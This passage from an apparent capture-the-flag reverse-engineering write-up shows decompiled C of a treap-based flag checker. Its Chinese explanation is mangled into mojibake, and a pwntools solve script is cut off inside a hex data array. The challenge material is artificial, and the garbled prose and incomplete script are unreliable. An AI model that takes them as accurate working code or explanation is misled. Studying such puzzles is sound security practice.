</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=o>*</span> <span class=nf>check</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>longlong</span> <span class=n>cur_node_idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>idx_cp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=n>idx</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>check</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>L</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>check</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>R</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>L</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>       <span class=p>(</span><span class=n>target_l</span><span class=p>[</span><span class=n>node_idx_ctr</span><span class=p>]</span> <span class=o>!=</span> <span class=p>(</span><span class=n>longlong</span><span class=p>)(</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>L</span> <span class=o>*</span> <span class=mi>23</span> <span class=o>+</span> <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>some_data</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>R</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>       <span class=p>(</span><span class=n>target_r</span><span class=p>[</span><span class=n>node_idx_ctr</span><span class=p>]</span> <span class=o>!=</span> <span class=p>(</span><span class=n>longlong</span><span class=p>)(</span><span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>R</span> <span class=o>*</span> <span class=mi>23</span> <span class=o>+</span> <span class=n>nodes</span><span class=p>[</span><span class=o>*</span><span class=n>idx</span><span class=p>].</span><span class=n>some_data</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_cp</span> <span class=o>=</span> <span class=o>*</span><span class=n>idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>cur_node_idx</span> <span class=o>=</span> <span class=p>(</span><span class=n>longlong</span><span class=p>)</span><span class=n>node_idx_ctr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>node_idx_ctr</span> <span class=o>=</span> <span class=n>node_idx_ctr</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>ulonglong</span><span class=p>)(</span><span class=n>uint</span><span class=p>)</span><span class=n>int_targets</span><span class=p>[</span><span class=n>cur_node_idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>nodes</span><span class=p>[</span><span class=n>idx_cp</span><span class=p>].</span><span class=n>value</span> <span class=o>!=</span> <span class=n>int_targets</span><span class=p>[</span><span class=n>cur_node_idx</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>undefined8</span> <span class=nf>main_really</span><span class=p>(</span><span class=n>undefined8</span> <span class=n>param_1</span><span class=p>,</span><span class=n>undefined8</span> <span class=n>param_2</span><span class=p>,</span><span class=n>undefined8</span> <span class=n>param_3</span><span class=p>,</span><span class=n>undefined8</span> <span class=n>param_4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>longlong</span> <span class=n>lVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>longlong</span> <span class=n>lVar2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>rnd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>_Seed</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>i_1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>longlong</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>flag_on_stack</span> <span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined8</span> <span class=n>uStack8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=n>uStack8</span> <span class=o>=</span> <span class=n>param_1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>_Seed</span> <span class=o>=</span> <span class=nf>seed</span><span class=p>((</span><span class=n>__time64_t</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=n>_Seed</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>print</span><span class=p>(</span><span class=s>&#34;flag:&#34;</span><span class=p>,</span><span class=n>param_2</span><span class=p>,</span><span class=n>param_3</span><span class=p>,</span><span class=n>param_4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span><span class=n>flag_input</span><span class=p>,</span><span class=n>param_3</span><span class=p>,</span><span class=n>param_4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=n>i_1</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i_1</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>i_1</span> <span class=o>=</span> <span class=n>i_1</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>rnd</span> <span class=o>=</span> <span class=nf>rng</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>flag_on_stack</span><span class=p>[</span><span class=n>i_1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)((</span><span class=n>longlong</span><span class=p>)</span><span class=n>rnd</span> <span class=o>%</span> <span class=mi>107</span><span class=p>)</span> <span class=o>+</span> <span class=mi>97</span> <span class=o>+</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>flag_input</span><span class=p>[</span><span class=n>i_1</span> <span class=o>+</span> <span class=mi>7</span><span class=p>]</span> <span class=o>+</span> <span class=n>i_1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(((((</span><span class=n>flag_input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;S&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>flag_input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;U&#39;</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>flag_input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;S&#39;</span><span class=p>))</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>      <span class=p>((</span><span class=n>flag_input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;C&#39;</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>flag_input</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;T&#39;</span><span class=p>))))</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>     <span class=p>((</span><span class=n>flag_input</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;F&#39;</span> <span class=o>&amp;&amp;</span> <span class=p>((</span><span class=n>flag_input</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;{&#39;</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>flag_input</span><span class=p>[</span><span class=mi>39</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;}&#39;</span><span class=p>))))))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>print</span><span class=p>(</span><span class=s>&#34;error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// length check here
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>j</span> <span class=o>=</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>insert</span><span class=p>(</span><span class=o>&amp;</span><span class=n>root</span><span class=p>,</span><span class=n>flag_on_stack</span><span class=p>[</span><span class=n>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>check</span><span class=p>(</span><span class=o>&amp;</span><span class=n>root</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>print</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>YES</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>é€†å‘ä¸»è¦æ˜¯æœ‰ä¸¤ç§ç±»å‹çš„åˆ¤æ–­
1.å¦‚æœæˆ‘ä»¬çŸ¥é“å“ªä¸ªcur_node_idx(ååºéå†ç´¢å¼•)å¯¹åº”å“ªä¸ªidxï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»int_targets[cur_node_idx]ä¸­å‡å»(rng()%107 + 97 + idx)æ¥æ‰¾åˆ°idxå¤„çš„æ ‡å¿—å­—ç¬¦ã€‚
2.å½“æˆ‘ä»¬çŸ¥é“è¯¥èŠ‚ç‚¹çš„å­—ç¬¦æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨check_lå’Œcheck_ræ‰¾åˆ°å­èŠ‚ç‚¹çš„ç´¢å¼•ã€‚ä½†æ˜¯ï¼Œå½“èŠ‚ç‚¹çš„ä¸¤è¾¹éƒ½æ²¡æœ‰å­©å­çš„æ—¶å€™ï¼Œè¿™å°±æœ‰ç‚¹æ£˜æ‰‹ã€‚
å¦‚æœcheck_x[cur_node_idx]åœ¨23ä»¥ä¸Šçš„æ®‹å·®ä¸å­—ç¬¦ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šçŸ¥é“å®ƒæ²¡æœ‰ä»¥è¿™ç§æ–¹å¼å‡ºç°çš„å­©å­å¦åˆ™æˆ‘ä»¥ä¸ºå®ƒæ˜¯æŒ‡æœ‰å­©å­
ç„¶ååªèƒ½æ…¢æ…¢æ‰‹åŠ¨ä¿®å¤
æœ‰äº†è¿™ä¸ªæƒ³æ³•ä¹‹å å°±å¯ä»¥æ…¢æ…¢é€’å½’çš„å»è§£å†³ä»–äº† ä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯ä¸èƒ½å¤Ÿä¸¢æ‰ç¬¬ä¸€ä¸ªèŠ‚ç‚¹
æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»–ä»¬çš„èŠ‚ç‚¹çš„ä¼˜å…ˆçº§æ¥è·å– è€Œä¸”ç”±äºTreapsçš„ç‰¹æ€§ï¼Œæˆ‘ä»¬çŸ¥é“æ ¹èŠ‚ç‚¹å°†æœ‰æœ€å°çš„ä¼˜å…ˆçº§ã€‚ç»“æœæ˜¯idx=4
exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>icecream</span> <span class=kn>import</span> <span class=n>ic</span>
</span></span><span class=line><span class=cl><span class=n>lrbuf</span> <span class=o>=</span> <span class=p>[</span> <span class=mh>0xa8</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x9e</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xbf</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x92</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xf0</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xc3</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x4d</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xfb</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x9e</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x91</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xe9</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xfc</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x1f</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xa4</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x92</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xac</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xfd</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x47</span><span 